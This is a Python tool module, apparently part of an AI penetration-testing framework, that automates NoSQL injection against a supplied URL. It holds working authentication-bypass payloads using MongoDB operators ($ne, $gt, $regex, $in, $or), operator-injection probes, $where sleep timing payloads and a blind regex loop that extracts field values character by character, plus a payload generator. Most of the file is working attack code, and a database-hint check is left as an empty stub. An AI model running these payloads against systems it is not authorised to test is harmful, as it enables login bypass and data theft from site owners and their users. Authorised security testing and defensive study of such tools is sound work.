"""
NoSQL Injection Tester - Automated NoSQL injection vulnerability detection.

Complements the nosql_injection.jinja prompt module with automated testing capabilities.
"""

import json
import time
from typing import Any, Literal
from urllib.parse import urlencode

import httpx

from strix.tools.registry import register_tool
from strix.tools.validation import (
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

NoSQLAction = Literal[
    "test_auth_bypass",
    "test_operator",
    "test_extraction",
    "test_timing",
    "generate_payloads",
    "analyze",
]

VALID_ACTIONS = [
    "test_auth_bypass",
    "test_operator",
    "test_extraction",
    "test_timing",
    "generate_payloads",
    "analyze",
]

# Common NoSQL injection payloads
AUTH_BYPASS_PAYLOADS = [
    # $ne operator
    {"username": "admin", "password": {"$ne": ""}},
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    # $gt operator
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    # $regex operator
    {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
    {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
    # $in operator
    {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}},
    # $or operator
    {"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}},
    # $exists
    {"username": {"$exists": True}, "password": {"$exists": True}},
]

# URL parameter payloads
URL_PARAM_PAYLOADS = [
    "username=admin&password[$ne]=",
    "username[$ne]=&password[$ne]=",
    "username=admin&password[$gt]=",
    "username[$regex]=.*&password[$ne]=",
    "username[$in][0]=admin&username[$in][1]=root&password[$ne]=",
]


@register_tool
def nosql_injection_tester(
    action: NoSQLAction,
    url: str,
    method: str = "POST",
    param_name: str | None = None,
    username_field: str = "username",
    password_field: str = "password",
    target_username: str = "admin",
    known_prefix: str | None = None,
    content_type: str = "json",
    headers: str | None = None,
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """
    Test for NoSQL injection vulnerabilities.

    Detects MongoDB, CouchDB, and other NoSQL injection vectors
    using operator injection, authentication bypass, and data extraction.

    Args:
        action: The testing action to perform
        url: Target URL to test
        method: HTTP method (GET, POST)
        param_name: Specific parameter to test
        username_field: Username field name
        password_field: Password field name
        target_username: Username to target for auth bypass
        known_prefix: Known prefix for extraction attacks
        content_type: Content type (json or form)
        headers: Additional headers as JSON string
        timeout: Request timeout in seconds

    Returns:
        Dictionary containing test results
    """
    unknown = validate_unknown_params(
        kwargs,
        ["action", "url", "method", "param_name", "username_field", "password_field",
         "target_username", "known_prefix", "content_type", "headers", "timeout"],
    )
    if unknown:
        return {"error": f"Unknown parameters: {unknown}"}

    action_error = validate_action_param(action, VALID_ACTIONS)
    if action_error:
        return action_error

    url_error = validate_required_param(url, "url")
    if url_error:
        return url_error

    # Parse additional headers
    extra_headers = {}
    if headers:
        try:
            extra_headers = json.loads(headers)
        except json.JSONDecodeError:
            return {"error": "Invalid JSON format for headers"}

    try:
        if action == "test_auth_bypass":
            return _test_auth_bypass(
                url, method, username_field, password_field,
                target_username, content_type, extra_headers, timeout
            )
        elif action == "test_operator":
            return _test_operator_injection(
                url, method, param_name, content_type, extra_headers, timeout
            )
        elif action == "test_extraction":
            return _test_data_extraction(
                url, method, param_name or username_field, known_prefix,
                content_type, extra_headers, timeout
            )
        elif action == "test_timing":
            return _test_timing_injection(
                url, method, username_field, password_field,
                content_type, extra_headers, timeout
            )
        elif action == "generate_payloads":
            return _generate_payloads(
                username_field, password_field, target_username, content_type
            )
        elif action == "analyze":
            return _analyze_nosql(
                url, method, username_field, password_field,
                content_type, extra_headers, timeout
            )
        else:
            return {"error": f"Unknown action: {action}"}
    except httpx.RequestError as e:
        return {"error": f"Request failed: {e!s}"}
    except Exception as e:
        return {"error": f"Test failed: {e!s}"}


def _send_request(
    client: httpx.Client,
    url: str,
    method: str,
    payload: dict | str,
    content_type: str,
    headers: dict,
) -> httpx.Response:
    """Send HTTP request with payload."""
    if method.upper() == "GET":
        if isinstance(payload, dict):
            # Convert to URL parameters
            params = _dict_to_url_params(payload)
            return client.get(f"{url}?{params}", headers=headers)
        else:
            return client.get(f"{url}?{payload}", headers=headers)
    else:
        if content_type == "json":
            return client.post(url, json=payload, headers=headers)
        else:
            if isinstance(payload, dict):
                return client.post(url, data=payload, headers=headers)
            else:
                return client.post(
                    url,
                    content=payload,
                    headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}
                )


def _dict_to_url_params(d: dict, prefix: str = "") -> str:
    """Convert nested dict to URL parameters (Express.js qs style)."""
    params = []
    for key, value in d.items():
        full_key = f"{prefix}[{key}]" if prefix else key
        if isinstance(value, dict):
            params.append(_dict_to_url_params(value, full_key))
        elif isinstance(value, list):
            for i, item in enumerate(value):
                params.append(f"{full_key}[{i}]={item}")
        elif isinstance(value, bool):
            params.append(f"{full_key}={str(value).lower()}")
        else:
            params.append(f"{full_key}={value}")
    return "&".join(params)


def _test_auth_bypass(
    url: str,
    method: str,
    username_field: str,
    password_field: str,
    target_username: str,
    content_type: str,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test for authentication bypass using NoSQL injection."""
    results = {
        "url": url,
        "method": method,
        "vulnerable": False,
        "successful_payloads": [],
        "responses": [],
    }

    with httpx.Client(timeout=timeout, follow_redirects=False) as client:
        # Get baseline response with invalid credentials
        baseline_payload = {username_field: target_username, password_field: "invalid_password_12345"}
        try:
            baseline = _send_request(client, url, method, baseline_payload, content_type, headers)
            baseline_info = {
                "status": baseline.status_code,
                "length": len(baseline.text),
                "type": "baseline",
            }
            results["baseline"] = baseline_info
        except Exception as e:
            results["baseline_error"] = str(e)
            baseline = None

        # Test JSON payloads
        for payload_template in AUTH_BYPASS_PAYLOADS:
            # Remap field names
            payload = {}
            for key, value in payload_template.items():
                if key == "username":
                    payload[username_field] = value if not isinstance(value, str) else target_username
                elif key == "password":
                    payload[password_field] = value
                else:
                    payload[key] = value

            try:
                resp = _send_request(client, url, method, payload, content_type, headers)

                response_info = {
                    "payload": payload,
                    "status": resp.status_code,
                    "length": len(resp.text),
                }

                # Check for successful bypass indicators
                if baseline:
                    if resp.status_code != baseline.status_code:
                        response_info["status_changed"] = True
                    if abs(len(resp.text) - len(baseline.text)) > 50:
                        response_info["length_changed"] = True

                # Success indicators
                success_indicators = [
                    resp.status_code in [200, 302, 303],
                    "success" in resp.text.lower(),
                    "welcome" in resp.text.lower(),
                    "dashboard" in resp.text.lower(),
                    "token" in resp.text.lower(),
                    "session" in resp.headers.get("set-cookie", "").lower(),
                ]

                if any(success_indicators) and resp.status_code != baseline.status_code if baseline else False:
                    response_info["potential_bypass"] = True
                    results["vulnerable"] = True
                    results["successful_payloads"].append(payload)

                results["responses"].append(response_info)

            except Exception as e:
                results["responses"].append({
                    "payload": payload,
                    "error": str(e),
                })

        # Test URL parameter payloads (for GET or form-encoded POST)
        if method.upper() == "GET" or content_type != "json":
            for param_payload in URL_PARAM_PAYLOADS:
                # Replace field names
                param_payload = param_payload.replace("username", username_field)
                param_payload = param_payload.replace("password", password_field)

                try:
                    resp = _send_request(client, url, method, param_payload, "form", headers)

                    response_info = {
                        "payload": param_payload,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "type": "url_params",
                    }

                    if baseline and resp.status_code != baseline.status_code:
                        response_info["potential_bypass"] = True
                        results["vulnerable"] = True

                    results["responses"].append(response_info)

                except Exception as e:
                    results["responses"].append({
                        "payload": param_payload,
                        "error": str(e),
                    })

    return results


def _test_operator_injection(
    url: str,
    method: str,
    param_name: str | None,
    content_type: str,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test specific parameter for operator injection."""
    results = {
        "url": url,
        "parameter": param_name or "various",
        "operator_injection": [],
        "vulnerable": False,
    }

    operators_to_test = [
        ("$ne", {"$ne": ""}),
        ("$gt", {"$gt": ""}),
        ("$lt", {"$lt": "z"}),
        ("$regex", {"$regex": ".*"}),
        ("$exists", {"$exists": True}),
        ("$in", {"$in": ["admin", "user"]}),
        ("$nin", {"$nin": [""]}),
        ("$or", "$or"),  # Special handling
    ]

    param = param_name or "test"

    with httpx.Client(timeout=timeout, follow_redirects=False) as client:
        # Baseline
        baseline_payload = {param: "normal_value"}
        try:
            baseline = _send_request(client, url, method, baseline_payload, content_type, headers)
            results["baseline"] = {
                "status": baseline.status_code,
                "length": len(baseline.text),
            }
        except Exception:
            baseline = None

        for op_name, op_value in operators_to_test:
            if op_name == "$or":
                payload = {"$or": [{param: "admin"}, {param: "user"}]}
            else:
                payload = {param: op_value}

            try:
                resp = _send_request(client, url, method, payload, content_type, headers)

                test_result = {
                    "operator": op_name,
                    "payload": payload,
                    "status": resp.status_code,
                    "length": len(resp.text),
                }

                # Check for injection indicators
                if baseline:
                    if resp.status_code != baseline.status_code:
                        test_result["status_changed"] = True
                        test_result["potential_injection"] = True
                    if abs(len(resp.text) - len(baseline.text)) > 100:
                        test_result["length_changed"] = True
                        test_result["potential_injection"] = True

                # Error-based detection
                error_indicators = ["mongodb", "bson", "query", "operator", "syntax"]
                if any(ind in resp.text.lower() for ind in error_indicators):
                    test_result["error_based"] = True
                    test_result["potential_injection"] = True

                if test_result.get("potential_injection"):
                    results["vulnerable"] = True

                results["operator_injection"].append(test_result)

            except Exception as e:
                results["operator_injection"].append({
                    "operator": op_name,
                    "error": str(e),
                })

    return results


def _test_data_extraction(
    url: str,
    method: str,
    param_name: str,
    known_prefix: str | None,
    content_type: str,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test blind data extraction using regex."""
    results = {
        "url": url,
        "parameter": param_name,
        "extraction_possible": False,
        "extracted": "",
        "tests": [],
    }

    prefix = known_prefix or ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"

    with httpx.Client(timeout=timeout, follow_redirects=False) as client:
        # First test if regex works
        test_payloads = [
            ({param_name: {"$regex": "^a"}}, "starts with 'a'"),
            ({param_name: {"$regex": "^z"}}, "starts with 'z'"),
            ({param_name: {"$regex": ".*"}}, "any value"),
        ]

        response_lengths = {}
        for payload, desc in test_payloads:
            try:
                resp = _send_request(client, url, method, payload, content_type, headers)
                response_lengths[desc] = len(resp.text)
                results["tests"].append({
                    "description": desc,
                    "payload": payload,
                    "status": resp.status_code,
                    "length": len(resp.text),
                })
            except Exception as e:
                results["tests"].append({"description": desc, "error": str(e)})

        # Check for differential responses
        if len(set(response_lengths.values())) > 1:
            results["extraction_possible"] = True
            results["note"] = "Different response lengths for different regex - extraction may be possible"

            # Attempt extraction if extraction is possible
            if known_prefix:
                extracted = prefix
                for _ in range(10):  # Max 10 chars
                    found = False
                    for char in charset:
                        test_regex = f"^{extracted}{char}"
                        payload = {param_name: {"$regex": test_regex}}
                        try:
                            resp = _send_request(client, url, method, payload, content_type, headers)
                            # Compare with "any" response to detect match
                            if len(resp.text) == response_lengths.get("any value", 0):
                                extracted += char
                                found = True
                                results["tests"].append({
                                    "found_char": char,
                                    "extracted_so_far": extracted,
                                })
                                break
                        except Exception:
                            continue

                    if not found:
                        break

                results["extracted"] = extracted

    return results


def _test_timing_injection(
    url: str,
    method: str,
    username_field: str,
    password_field: str,
    content_type: str,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test for timing-based NoSQL injection using $where."""
    results = {
        "url": url,
        "timing_injection": False,
        "where_enabled": False,
        "timing_tests": [],
    }

    # $where payloads with sleep
    timing_payloads = [
        ({username_field: "admin", "$where": "sleep(2000)"}, 2000),
        ({username_field: "admin", "$where": "this.password && sleep(2000)"}, 2000),
        ({"$where": "sleep(2000)"}, 2000),
    ]

    with httpx.Client(timeout=max(timeout, 15), follow_redirects=False) as client:
        # Baseline timing
        baseline_payload = {username_field: "admin", password_field: "test"}
        try:
            start = time.time()
            _send_request(client, url, method, baseline_payload, content_type, headers)
            baseline_time = time.time() - start
            results["baseline_time_ms"] = round(baseline_time * 1000, 2)
        except Exception:
            baseline_time = 0.5

        for payload, expected_delay_ms in timing_payloads:
            try:
                start = time.time()
                resp = _send_request(client, url, method, payload, content_type, headers)
                elapsed = time.time() - start
                elapsed_ms = round(elapsed * 1000, 2)

                test_result = {
                    "payload": payload,
                    "elapsed_ms": elapsed_ms,
                    "expected_delay_ms": expected_delay_ms,
                    "status": resp.status_code,
                }

                # Check if response was delayed
                if elapsed_ms > baseline_time * 1000 + expected_delay_ms * 0.5:
                    test_result["timing_detected"] = True
                    results["timing_injection"] = True
                    results["where_enabled"] = True

                results["timing_tests"].append(test_result)

            except httpx.TimeoutException:
                results["timing_tests"].append({
                    "payload": payload,
                    "timeout": True,
                    "note": "Request timed out - may indicate successful sleep",
                })
                results["timing_injection"] = True
                results["where_enabled"] = True

            except Exception as e:
                results["timing_tests"].append({
                    "payload": payload,
                    "error": str(e),
                })

    results["vulnerable"] = results["timing_injection"]

    return results


def _generate_payloads(
    username_field: str,
    password_field: str,
    target_username: str,
    content_type: str,
) -> dict[str, Any]:
    """Generate NoSQL injection payloads."""
    payloads = {
        "auth_bypass_json": [],
        "auth_bypass_url": [],
        "operator_injection": [],
        "javascript_injection": [],
        "data_extraction": [],
    }

    # Auth bypass JSON
    payloads["auth_bypass_json"] = [
        {username_field: target_username, password_field: {"$ne": ""}},
        {username_field: target_username, password_field: {"$gt": ""}},
        {username_field: {"$ne": ""}, password_field: {"$ne": ""}},
        {username_field: {"$regex": f"^{target_username}"}, password_field: {"$ne": ""}},
        {"$or": [{username_field: target_username}, {username_field: "admin"}], password_field: {"$ne": ""}},
        {username_field: {"$in": [target_username, "admin", "root"]}, password_field: {"$ne": ""}},
    ]

    # Auth bypass URL params
    payloads["auth_bypass_url"] = [
        f"{username_field}={target_username}&{password_field}[$ne]=",
        f"{username_field}[$ne]=&{password_field}[$ne]=",
        f"{username_field}={target_username}&{password_field}[$gt]=",
        f"{username_field}[$regex]=.*&{password_field}[$ne]=",
        f"{username_field}[$in][0]={target_username}&{username_field}[$in][1]=admin&{password_field}[$ne]=",
    ]

    # Operator injection
    payloads["operator_injection"] = [
        {"field": {"$ne": ""}},
        {"field": {"$gt": ""}},
        {"field": {"$regex": ".*"}},
        {"field": {"$exists": True}},
        {"field": {"$type": "string"}},
        {"$or": [{"field": "value1"}, {"field": "value2"}]},
    ]

    # JavaScript injection ($where)
    payloads["javascript_injection"] = [
        {"$where": "1==1"},
        {"$where": "this.password.length > 0"},
        {"$where": "sleep(5000)"},
        {"$where": "this.password.match(/^a/)"},
        {username_field: target_username, "$where": "this.password"},
    ]

    # Data extraction
    payloads["data_extraction"] = [
        {username_field: {"$regex": "^a"}},
        {username_field: {"$regex": "^ad"}},
        {username_field: {"$regex": "^adm"}},
        {password_field: {"$regex": "^.{8,}"}},  # Password length check
    ]

    return payloads


def _analyze_nosql(
    url: str,
    method: str,
    username_field: str,
    password_field: str,
    content_type: str,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Comprehensive NoSQL injection analysis."""
    results = {
        "url": url,
        "method": method,
        "content_type": content_type,
        "vulnerability_assessment": {},
        "database_hints": [],
        "recommendations": [],
    }

    # Run auth bypass test
    auth_result = _test_auth_bypass(
        url, method, username_field, password_field,
        "admin", content_type, headers, timeout
    )
    results["vulnerability_assessment"]["auth_bypass"] = auth_result.get("vulnerable", False)

    # Run operator test
    operator_result = _test_operator_injection(
        url, method, username_field, content_type, headers, timeout
    )
    results["vulnerability_assessment"]["operator_injection"] = operator_result.get("vulnerable", False)

    # Run timing test
    timing_result = _test_timing_injection(
        url, method, username_field, password_field, content_type, headers, timeout
    )
    results["vulnerability_assessment"]["timing_injection"] = timing_result.get("vulnerable", False)
    results["vulnerability_assessment"]["where_enabled"] = timing_result.get("where_enabled", False)

    # Determine overall vulnerability
    results["vulnerable"] = any(results["vulnerability_assessment"].values())

    # Database hints from responses
    all_responses = (
        auth_result.get("responses", []) +
        operator_result.get("operator_injection", []) +
        timing_result.get("timing_tests", [])
    )

    db_indicators = {
        "mongodb": ["mongodb", "bson", "objectid", "mongoclient"],
        "couchdb": ["couchdb", "futon", "design doc"],
        "redis": ["redis", "redisql"],
        "firebase": ["firebase", "firestore"],
    }

    for resp in all_responses:
        if isinstance(resp, dict) and "error" not in resp:
            # Could check response text for hints in a real implementation
            pass

    # Generate recommendations
    if results["vulnerable"]:
        results["recommendations"] = [
            "Use parameterized queries or ODM with sanitization",
            "Implement strict type checking on all inputs",
            "Disable $where and JavaScript execution if not needed",
            "Use schema validation to enforce field types",
            "Implement rate limiting and anomaly detection",
            "Review all query construction for operator injection",
        ]
    else:
        results["recommendations"] = [
            "Continue monitoring for NoSQL injection attempts",
            "Ensure consistent input validation across all endpoints",
            "Consider Web Application Firewall rules for NoSQL patterns",
        ]

    results["test_summary"] = {
        "auth_bypass": auth_result,
        "operator_injection": operator_result,
        "timing_injection": timing_result,
    }

    return results
